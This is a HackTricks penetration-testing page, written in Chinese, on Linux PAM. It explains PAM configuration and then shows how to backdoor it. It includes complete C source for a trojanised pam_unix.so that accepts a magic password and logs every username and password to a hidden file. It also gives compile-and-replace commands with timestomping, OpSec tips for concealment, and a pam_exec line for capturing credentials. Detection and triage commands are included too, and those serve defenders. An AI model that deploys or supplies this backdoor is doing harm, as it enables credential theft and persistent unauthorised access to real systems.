# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### 基本信息

**PAM (Pluggable Authentication Modules)** 充当一种安全机制，用于**验证尝试访问计算机服务的用户身份**，并根据各种条件控制其访问权限。它类似于数字门卫，确保只有经过授权的用户才能使用特定服务，同时可能限制其使用，以防止系统过载。

#### 配置文件

- **Solaris 和基于 UNIX 的系统**通常使用位于 `/etc/pam.conf` 的中央配置文件。
- **Linux 系统**更倾向于采用目录方式，将特定服务的配置存储在 `/etc/pam.d` 中。例如，login 服务的配置文件位于 `/etc/pam.d/login`。<sup>[[1]](#references)</sup>

login 服务的 PAM 配置示例可能如下所示：
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

这些 realms 或 management groups 包括 **auth**、**account**、**password** 和 **session**，分别负责 authentication 和 session management 过程的不同方面：<sup>[[1]](#references)</sup>

- **Auth**：验证用户身份，通常会提示输入 password。
- **Account**：处理 account verification，检查 group membership 或 time-of-day restrictions 等条件。
- **Password**：管理 password 更新，包括 complexity checks 或 dictionary attacks prevention。
- **Session**：管理 service session 开始或结束期间的操作，例如挂载目录或设置 resource limits。

#### **PAM Module Controls**

Controls 决定 module 对 success 或 failure 的响应，并影响整个 authentication 过程。这些 controls 包括：<sup>[[1]](#references)</sup>

- **Required**：required module 失败会最终导致 failure，但只有在检查完所有后续 modules 后才会返回。
- **Requisite**：失败后立即终止该过程。
- **Sufficient**：success 会跳过同一 realm 中其余的 checks，除非后续 module 失败。
- **Optional**：只有当它是 stack 中唯一的 module 时，才会导致 failure。

#### Offensive Semantics That Matter

对 PAM 进行 Backdooring 时，**插入 rule 的位置**通常比 payload 本身更重要：

- `include` 和 `substack` 会从其他 files 中引入 rules，因此编辑 `sshd` 可能只影响 SSH，而编辑 `system-auth`、`common-auth` 或其他 shared stack 则会同时影响多个 services。
- PAM 还支持诸如 `[success=1 default=ignore]` 的 bracketed controls。这些 controls 可在 custom check 成功后 **skip 一个或多个 modules**，而不是明显地替换 `pam_unix.so`。
- `module-path` 可以是**绝对路径**（`/usr/lib/security/pam_custom.so`），也可以是相对于默认 PAM module directory 的**相对路径**。在现代 Linux systems 上，实际 directories 通常是 `/lib/security`、`/lib64/security`、`/usr/lib/security`，或类似 `/usr/lib/x86_64-linux-gnu/security` 的 multiarch paths。

Quick operator takeaway：在 patching 之前，始终映射完整的 **service graph**。例如，在某些 distros 上是 `sshd -> password-auth -> system-auth`，而在其他 distros 上是 `sshd -> system-remote-login -> system-login -> system-auth`，这意味着同一个 one-line implant 的影响范围可能远大于预期。

#### Example Scenario

在包含多个 auth modules 的 setup 中，该过程会遵循严格的顺序。如果 `pam_securetty` module 发现 login terminal 未授权，则会阻止 root logins，但由于其 status 为 "required"，所有 modules 仍会继续处理。`pam_env` 会设置 environment variables，可能改善 user experience。`pam_ldap` 和 `pam_unix` modules 会协同验证 user，其中 `pam_unix` 会尝试使用先前提供的 password，从而提高 authentication methods 的效率和灵活性。


## Backdooring PAM – Hooking `pam_unix.so`

在高价值 Linux environments 中，一个经典的 persistence trick 是**将合法的 PAM library 替换为 trojanised drop-in**。由于每次 SSH / console login 最终都会调用 `pam_unix.so:pam_sm_authenticate()`，只需几行 C 代码就足以 capture credentials 或实现 *magic* password bypass。<sup>[[2]](#references)</sup>

### Compilation Cheatsheet
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
编译并隐蔽替换：
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec Tips
1. **Atomic overwrite** – 写入临时文件，然后使用 `mv` 将其放置到目标位置，以避免生成会锁定 SSH 的半写入库文件。
2. 将日志文件放置在 `/usr/bin/.dbus.log` 等位置，可与合法的桌面 artefacts 混淆。
3. 保持符号导出完全一致（`pam_sm_setcred` 等），以避免 PAM 行为异常。

### Detection
* 将 `pam_unix.so` 的 MD5/SHA256 与 distro package 进行比较。
* 使用 `rpm -V pam` 或 `debsums -s libpam-modules`，无需手动计算 hash 即可发现被替换的库。
* 检查 `/lib/security/` 下是否存在对所有用户可写或所有权异常的文件。
* `auditd` rule：`-w /lib/security/pam_unix.so -p wa -k pam-backdoor`。
* 使用 grep 检查 PAM 配置中是否存在意外模块：`grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`。

### Quick triage commands (post-compromise or threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### 滥用 `pam_exec` 实现 persistence
与替换 `pam_unix.so` 不同，更轻量的做法是在 `/etc/pam.d/sshd` 中追加一行 `pam_exec`，这样每次 SSH 登录都会启动 implant，同时保留正常的认证堆栈：
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` 会通过环境变量接收 PAM 元数据，例如 `PAM_USER`、`PAM_RHOST`、`PAM_SERVICE`、`PAM_TTY` 和 `PAM_TYPE`。使用 `expose_authtok` 时，helper 还可以在 `auth` 或 `password` 阶段从 `stdin` 读取密码。如果希望 helper 以 effective UID 而非 real UID 运行，请添加 `seteuid`。

实践注意事项：

- `session optional pam_exec.so ...` 更适合用于 **post-login actions**，例如重新打开 sockets 或生成 detached daemon。
- `auth optional pam_exec.so quiet expose_authtok ...` 通常用于 **credential capture**，因为它会在 session 打开前运行。
- 可以使用 `type=session` 或 `type=auth` 将执行限制在特定的 PAM 阶段，从而避免产生嘈杂的重复执行。

### 应对发行版工具：`authselect`

在 RHEL、CentOS Stream、Fedora 及其衍生系统上，直接编辑 `/etc/pam.d/system-auth` 或 `/etc/pam.d/password-auth` 等生成文件，可能会被 **`authselect` 覆盖**。为了持久化，operators 通常会修改 `/etc/authselect/custom/<profile>/` 下当前使用的 custom profile，然后重新选择或应用该 profile。

当你拥有 root 权限时，典型工作流程如下：
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
这对攻击和 triage 都很重要：如果 `/etc/pam.d/system-auth` 包含横幅 `Generated by authselect` 和 `Do not modify this file manually`，那么真正的 persistence 位置可能位于 `/etc/authselect/custom/`，而不是 `/etc/pam.d/`。

### 近期在野外观察到的 tradecraft

2025 年近期关于 **Plague** Linux backdoor 的报告显示，同一核心思路得到了进一步发展：一个带有**静态 bypass password** 的恶意 PAM 组件，同时清理与 SSH 相关的环境变量和 shell history（`HISTFILE=/dev/null`），以减少登录后的 session 痕迹。<sup>[[3]](#references)</sup> 这是一个有用的 hunting pattern，因为 backdoor 逻辑可能位于 PAM 中，而 stealth artifacts 只会在 authentication 成功**之后**出现。


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM 手册](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [隐蔽 Operator 的 Playbook：渗透全球电信网络 - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague：新发现的基于 PAM 的 Linux backdoor](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
